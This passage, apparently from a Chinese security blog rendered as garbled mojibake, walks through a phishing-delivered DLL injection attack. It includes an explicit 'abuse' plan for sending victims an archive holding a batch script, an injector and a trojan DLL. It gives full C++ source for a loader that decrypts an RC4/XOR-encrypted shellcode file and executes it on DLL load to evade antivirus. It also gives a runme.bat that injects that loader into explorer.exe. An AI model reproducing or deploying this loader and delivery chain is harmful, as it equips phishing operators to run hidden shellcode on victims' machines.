</span></span></code></pre></td></tr></table></div></div><h3 id=ä»£ç å®ç°é€»è¾‘>ä»£ç å®ç°é€»è¾‘<a hidden class=anchor aria-hidden=true href=#ä»£ç å®ç°é€»è¾‘>#</a></h3><p>ä¸»å‡½æ•°wmainæ¥æ”¶ä¸¤ä¸ªå‚æ•° pid ä¸ dll name ï¼Œå³æ³¨å…¥åº”ç”¨çš„pidä¸æ³¨å…¥çš„dllçš„è·¯å¾„</p><p>è¿è¡Œåï¼Œä»£ç å°†ä½¿ç”¨OpenProcessæ‰“å¼€ç›®æ ‡è¿›ç¨‹ï¼Œä¸ºå…¶åˆ†é…(VirtualAllocEx)å¹¶å†™å…¥dllè·¯å¾„(WriteProcessMemory)è¿œç¨‹å†…å­˜ï¼›ç„¶åä½¿ç”¨kernel32.dllçš„LoadLibraryAå‡½æ•°è¿œç¨‹åŠ è½½dllï¼›æœ€ååˆ©ç”¨CreateRemoteThreadåˆ›å»ºè¿œç¨‹çº¿ç¨‹ï¼Œå…¥å£å³ä¸ºLoadLibraryAï¼Œä»¥åŠ è½½æŒ‡å®šdllï¼Œç„¶åç­‰å¾…å…¶è¿è¡Œå³å¯ï¼Œç›´è‡³å…¶çº¿ç¨‹å®Œæˆï¼Œé€šè¿‡WaitForSingleObjectç­‰å¾…å…¶ç»“æœã€‚å…¶ä¸­DataToTreeç±»çš„ææ„å‡½æ•°ä¼šåœ¨ç¨‹åºç»“æŸæˆ–é”™è¯¯æ—¶è‡ªåŠ¨é‡Šæ”¾æ‰€æœ‰èµ„æºï¼ŒåŒ…æ‹¬å…³é—­å¥æŸ„å’Œé‡Šæ”¾å†…å­˜ã€‚</p><h3 id=æ³¨å…¥å™¨ä½¿ç”¨æ–¹å¼>æ³¨å…¥å™¨ä½¿ç”¨æ–¹å¼<a hidden class=anchor aria-hidden=true href=#æ³¨å…¥å™¨ä½¿ç”¨æ–¹å¼>#</a></h3><p>è¯¥æ³¨å…¥å™¨ä½¿ç”¨åªéœ€ä¸¤ä¸ªå‚æ•°ï¼š</p><ul><li><strong>pid : ç›®æ ‡è¿›ç¨‹çš„è¿›ç¨‹ID</strong></li><li><strong>dll name: æƒ³è¦æ³¨å…¥ç›®æ ‡è¿›ç¨‹çš„DLLç»å¯¹è·¯å¾„</strong></li></ul><h3 id=æ»¥ç”¨æ€è·¯>æ»¥ç”¨æ€è·¯<a hidden class=anchor aria-hidden=true href=#æ»¥ç”¨æ€è·¯>#</a></h3><ol><li>é’“é±¼çš„æ—¶å€™å¯ä»¥å‘é€ä¸€ä¸ªBATæ‰¹å¤„ç†è„šæœ¬ã€dllæ³¨å…¥å™¨ã€dllæœ¨é©¬</li><li>BATæ‰¹å¤„ç†ï¼šè·å–x64è¿›ç¨‹çš„pid</li><li>BATæ‰¹å¤„ç†ï¼šè·å–dllæœ¨é©¬ç»å¯¹è·¯å¾„</li><li>BATæ‰¹å¤„ç†ï¼šæ‰§è¡Œdllæ³¨å…¥å™¨ï¼Œå°†dllæœ¨é©¬æ³¨å…¥åˆ°ç›®æ ‡è¿›ç¨‹ä¸­</li></ol><p>æ„é€ å¦‚å›¾æ‰€ç¤ºçš„å‹ç¼©åŒ…ï¼Œè§£å‹åå¾—åˆ°é’“é±¼æœ¨é©¬æ–‡ä»¶ï¼š
<img loading=lazy src=/postPic/image-20240816145752608.png alt=åŠ è½½å¤±è´¥></p><h3 id=ç¼–å†™dllæœ¨é©¬>ç¼–å†™dllæœ¨é©¬<a hidden class=anchor aria-hidden=true href=#ç¼–å†™dllæœ¨é©¬>#</a></h3><p>ä¸ºäº†ä½¿æ¶æ„dllæ³¨å…¥è¿›äº†ç›®æ ‡è¿›ç¨‹åèƒ½è‡ªåŠ¨è¢«è°ƒç”¨ï¼Œåˆ™å°†æ¶æ„ä»£ç å†™å…¥dllmainä¸­ã€‚</p><p>æ€è·¯æ˜¯åœ¨å…¥å£ç‚¹æ‰§è¡Œå‡½æ•°ï¼Œç”³è¯·ä¸€ä¸ªæ–°çº¿ç¨‹ï¼Œç„¶åå¯åŠ¨æœ¨é©¬å‡½æ•°ï¼Œè¿›è¡Œshellcodeçš„è§£å¯†ä¸åŠ è½½ï¼Œç„¶åæœ‰åºå…³é—­å¥æŸ„å¹¶æ¸…ç†èµ„æºã€‚</p><h4 id=dllmaincpp><code>dllmain.cpp</code><a hidden class=anchor aria-hidden=true href=#dllmaincpp>#</a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&#34;pch.h&#34;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;windows.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;iostream&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fstream&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;cstring&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=c1>// é™æ€å˜é‡å’Œå¥æŸ„
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>static</span> <span class=n>HANDLE</span> <span class=n>hThread</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=n>HANDLE</span> <span class=n>hFile</span> <span class=o>=</span> <span class=n>INVALID_HANDLE_VALUE</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>const</span> <span class=kt>char</span><span class=o>*</span> <span class=n>SHELLCODE_FILE</span> <span class=o>=</span> <span class=s>&#34;p64e.bin&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>const</span> <span class=kt>char</span><span class=o>*</span> <span class=n>RC4_KEY</span> <span class=o>=</span> <span class=s>&#34;iC4n7&#39;tHelpmYSe1f14ugh1n9&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>const</span> <span class=kt>char</span><span class=o>*</span> <span class=n>XOR_KEY</span> <span class=o>=</span> <span class=s>&#34;411oFusd0n&#39;tKn0wWh4t&#39;sG01n90n!&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// RC4è§£å¯†
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>char</span><span class=o>*</span> <span class=nf>spellRC4</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>spell</span><span class=p>,</span> <span class=kt>int</span> <span class=n>spellLength</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>S</span><span class=p>[</span><span class=mi>256</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>i</span><span class=p>,</span> <span class=n>j</span><span class=p>,</span> <span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>,</span> <span class=n>t</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span><span class=o>*</span> <span class=n>ciphertext</span> <span class=o>=</span> <span class=k>new</span> <span class=kt>char</span><span class=p>[</span><span class=n>spellLength</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>256</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>S</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>256</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>j</span> <span class=o>=</span> <span class=p>(</span><span class=n>j</span> <span class=o>+</span> <span class=n>S</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>+</span> <span class=n>RC4_KEY</span><span class=p>[</span><span class=n>i</span> <span class=o>%</span> <span class=n>strlen</span><span class=p>(</span><span class=n>RC4_KEY</span><span class=p>)])</span> <span class=o>%</span> <span class=mi>256</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>std</span><span class=o>::</span><span class=n>swap</span><span class=p>(</span><span class=n>S</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=n>S</span><span class=p>[</span><span class=n>j</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>y</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>k</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>k</span> <span class=o>&lt;</span> <span class=n>spellLength</span><span class=p>;</span> <span class=n>k</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>x</span> <span class=o>=</span> <span class=p>(</span><span class=n>x</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>%</span> <span class=mi>256</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>y</span> <span class=o>=</span> <span class=p>(</span><span class=n>y</span> <span class=o>+</span> <span class=n>S</span><span class=p>[</span><span class=n>x</span><span class=p>])</span> <span class=o>%</span> <span class=mi>256</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>std</span><span class=o>::</span><span class=n>swap</span><span class=p>(</span><span class=n>S</span><span class=p>[</span><span class=n>x</span><span class=p>],</span> <span class=n>S</span><span class=p>[</span><span class=n>y</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=n>t</span> <span class=o>=</span> <span class=p>(</span><span class=n>S</span><span class=p>[</span><span class=n>x</span><span class=p>]</span> <span class=o>+</span> <span class=n>S</span><span class=p>[</span><span class=n>y</span><span class=p>])</span> <span class=o>%</span> <span class=mi>256</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>ciphertext</span><span class=p>[</span><span class=n>k</span><span class=p>]</span> <span class=o>=</span> <span class=n>spell</span><span class=p>[</span><span class=n>k</span><span class=p>]</span> <span class=o>^</span> <span class=n>S</span><span class=p>[</span><span class=n>t</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>ciphertext</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// XORè§£å¯†
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>char</span><span class=o>*</span> <span class=nf>spellXOR</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>spell</span><span class=p>,</span> <span class=kt>int</span> <span class=n>spellLength</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>keyLength</span> <span class=o>=</span> <span class=n>strlen</span><span class=p>(</span><span class=n>XOR_KEY</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>spellLength</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>spell</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>spell</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^</span> <span class=n>XOR_KEY</span><span class=p>[</span><span class=n>i</span> <span class=o>%</span> <span class=n>keyLength</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>spell</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// è§£å¯†å’Œæ‰§è¡Œå‡½æ•°
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>void</span> <span class=nf>cast_spell_3</span><span class=p>(</span><span class=kt>char</span><span class=o>*</span> <span class=n>spell</span><span class=p>,</span> <span class=kt>int</span> <span class=n>spellSize</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>DWORD</span> <span class=n>dwOldProtect</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>HANDLE</span> <span class=n>HeapHandle</span> <span class=o>=</span> <span class=n>HeapCreate</span><span class=p>(</span><span class=n>HEAP_CREATE_ENABLE_EXECUTE</span><span class=p>,</span> <span class=n>spellSize</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span><span class=o>*</span> <span class=n>buf</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=n>HeapAlloc</span><span class=p>(</span><span class=n>HeapHandle</span><span class=p>,</span> <span class=n>HEAP_ZERO_MEMORY</span><span class=p>,</span> <span class=n>spellSize</span><span class=p>);</span> <span class=c1>//å †è°ƒç”¨
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>memcpy</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=n>spell</span><span class=p>,</span> <span class=n>spellSize</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>VirtualProtect</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=n>spellSize</span><span class=p>,</span> <span class=n>PAGE_EXECUTE</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>dwOldProtect</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>HANDLE</span> <span class=n>hThread</span> <span class=o>=</span> <span class=n>CreateThread</span><span class=p>(</span><span class=nb>NULL</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=p>(</span><span class=n>LPTHREAD_START_ROUTINE</span><span class=p>)</span><span class=n>buf</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>WaitForSingleObject</span><span class=p>(</span><span class=n>hThread</span><span class=p>,</span> <span class=n>INFINITE</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// DLLå¯¼å‡ºå‡½æ•°ï¼Œè¯»å–ã€è§£å¯†å’Œæ‰§è¡Œshellcode
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>extern</span> <span class=s>&#34;C&#34;</span> <span class=kr>__declspec</span><span class=p>(</span><span class=n>dllexport</span><span class=p>)</span> <span class=kt>void</span> <span class=n>RunShellcode</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>std</span><span class=o>::</span><span class=n>ifstream</span> <span class=n>spellfile</span><span class=p>(</span><span class=n>SHELLCODE_FILE</span><span class=p>,</span> <span class=n>std</span><span class=o>::</span><span class=n>ios</span><span class=o>::</span><span class=n>in</span> <span class=o>|</span> <span class=n>std</span><span class=o>::</span><span class=n>ios</span><span class=o>::</span><span class=n>binary</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>spellfile</span><span class=p>.</span><span class=n>seekg</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>std</span><span class=o>::</span><span class=n>ios</span><span class=o>::</span><span class=n>end</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>length</span> <span class=o>=</span> <span class=n>spellfile</span><span class=p>.</span><span class=n>tellg</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=n>spellfile</span><span class=p>.</span><span class=n>seekg</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>std</span><span class=o>::</span><span class=n>ios</span><span class=o>::</span><span class=n>beg</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>char</span><span class=o>*</span> <span class=n>spelldata</span> <span class=o>=</span> <span class=k>new</span> <span class=kt>char</span><span class=p>[</span><span class=n>length</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=n>spellfile</span><span class=p>.</span><span class=n>read</span><span class=p>(</span><span class=n>spelldata</span><span class=p>,</span> <span class=n>length</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>spellfile</span><span class=p>.</span><span class=n>close</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>spelldata</span> <span class=o>=</span> <span class=n>spellRC4</span><span class=p>(</span><span class=n>spelldata</span><span class=p>,</span> <span class=n>length</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>spelldata</span> <span class=o>=</span> <span class=n>spellXOR</span><span class=p>(</span><span class=n>spelldata</span><span class=p>,</span> <span class=n>length</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>cast_spell_3</span><span class=p>(</span><span class=n>spelldata</span><span class=p>,</span> <span class=n>length</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>delete</span><span class=p>[]</span> <span class=n>spelldata</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// çº¿ç¨‹å‡½æ•°
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>DWORD</span> <span class=n>WINAPI</span> <span class=nf>ThreadProc</span><span class=p>(</span><span class=n>LPVOID</span> <span class=n>lpParameter</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>RunShellcode</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// æ¸…ç†èµ„æºå‡½æ•°
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kt>void</span> <span class=nf>CleanupResources</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>hFile</span> <span class=o>!=</span> <span class=n>INVALID_HANDLE_VALUE</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>CloseHandle</span><span class=p>(</span><span class=n>hFile</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>hFile</span> <span class=o>=</span> <span class=n>INVALID_HANDLE_VALUE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// DLLå…¥å£ç‚¹
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>BOOL</span> <span class=n>APIENTRY</span> <span class=nf>DllMain</span><span class=p>(</span><span class=n>HMODULE</span> <span class=n>hModule</span><span class=p>,</span> <span class=n>DWORD</span> <span class=n>ul_reason_for_call</span><span class=p>,</span> <span class=n>LPVOID</span> <span class=n>lpReserved</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>switch</span> <span class=p>(</span><span class=n>ul_reason_for_call</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=nl>DLL_PROCESS_ATTACH</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>hThread</span> <span class=o>=</span> <span class=n>CreateThread</span><span class=p>(</span><span class=nb>NULL</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>ThreadProc</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>hThread</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>std</span><span class=o>::</span><span class=n>cerr</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;Error creating thread: &#34;</span> <span class=o>&lt;&lt;</span> <span class=n>GetLastError</span><span class=p>()</span> <span class=o>&lt;&lt;</span> <span class=n>std</span><span class=o>::</span><span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=nl>DLL_THREAD_ATTACH</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=nl>DLL_THREAD_DETACH</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>case</span> <span class=nl>DLL_PROCESS_DETACH</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>hThread</span> <span class=o>!=</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>WaitForSingleObject</span><span class=p>(</span><span class=n>hThread</span><span class=p>,</span> <span class=n>INFINITE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>CloseHandle</span><span class=p>(</span><span class=n>hThread</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>hThread</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>CleanupResources</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>TRUE</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>é™æ€å…æ€æ€è·¯å°±æ˜¯shellcodeåˆ†ç¦»ä¸åŠ å¯†ï¼Œæ‰€ä»¥éœ€è¦åŒæ­¥é…ç½®ä¸€ä¸ªp64e.binæ–‡ä»¶</p><h3 id=batè„šæœ¬å®ç°æ³¨å…¥>batè„šæœ¬å®ç°æ³¨å…¥<a hidden class=anchor aria-hidden=true href=#batè„šæœ¬å®ç°æ³¨å…¥>#</a></h3><p>é“¾æ¥ç”Ÿæˆdllåï¼Œä½¿ç”¨batè„šæœ¬è¿›è¡Œæ³¨å…¥ã€‚æ³¨å…¥åŸºæœ¬æ€è·¯æ˜¯</p><ol><li>è·å–x64è¿›ç¨‹çš„pid</li><li>è·å–dllæœ¨é©¬ç»å¯¹è·¯å¾„</li><li>æ‰§è¡Œdllæ³¨å…¥å™¨ï¼Œå°†dllæœ¨é©¬æ³¨å…¥åˆ°ç›®æ ‡è¿›ç¨‹ä¸­</li></ol><h4 id=runmebat><code>runme.bat</code><a hidden class=anchor aria-hidden=true href=#runmebat>#</a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>@echo off
</span></span><span class=line><span class=cl>setlocal
</span></span><span class=line><span class=cl><span class=nb>set</span> <span class=s2>&#34;target_process_name=explorer.exe&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>set</span> <span class=s2>&#34;dll_name=Loader.dll&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>set</span> <span class=s2>&#34;injecter=inject_dll_amd64.exe&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> /f <span class=s2>&#34;tokens=2&#34;</span> %%i in <span class=o>(</span><span class=s1>&#39;tasklist ^| findstr /i &#34;%target_process_name%&#34;&#39;</span><span class=o>)</span> <span class=k>do</span> <span class=nb>set</span> <span class=s2>&#34;pid=%%i&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>set</span> <span class=s2>&#34;command=%CD%\%injecter% %pid% %CD%\%dll_name%&#34;</span>
</span></span><span class=line><span class=cl>:: å¤„ç†å¼•å· æ‰§è¡Œ
</span></span><span class=line><span class=cl><span class=s2>&#34;%CD%\%injecter%&#34;</span> %pid% <span class=s2>&#34;%CD%\%dll_name%&#34;</span>
